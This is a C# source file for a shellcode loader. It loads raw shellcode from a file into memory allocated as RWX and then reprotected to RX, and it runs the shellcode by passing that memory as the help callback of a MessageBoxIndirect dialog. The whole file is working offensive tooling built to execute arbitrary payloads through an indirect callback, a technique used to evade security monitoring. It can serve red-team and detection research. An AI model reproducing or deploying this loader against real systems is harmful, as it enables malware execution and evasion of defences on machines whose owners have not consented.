// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MessageBoxIndirect
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: MessageBoxIndirect.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            MSGBOXPARAMS sMsgBoxParams = new MSGBOXPARAMS();
            sMsgBoxParams.dwStyle = (uint)(0x00004000L); // Should have an ok button and a help button
            sMsgBoxParams.lpfnMsgBoxCallback = hAlloc; 
            sMsgBoxParams.lpszText = "Click help for shellcode!";
            sMsgBoxParams.cbSize = (uint)Marshal.SizeOf(sMsgBoxParams);

            MessageBoxIndirect(sMsgBoxParams);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int MessageBoxIndirect(MSGBOXPARAMS lbmp);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct MSGBOXPARAMS
        {
            public uint cbSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            [MarshalAs(UnmanagedType.LPWStr)] public string lpszText;
            [MarshalAs(UnmanagedType.LPWStr)] public string lpszCaption;
            public uint dwStyle;
            public IntPtr lpszIcon;
            public IntPtr dwContextHelpId;
            public IntPtr lpfnMsgBoxCallback;
            public uint dwLanguageId;
        }
    }
}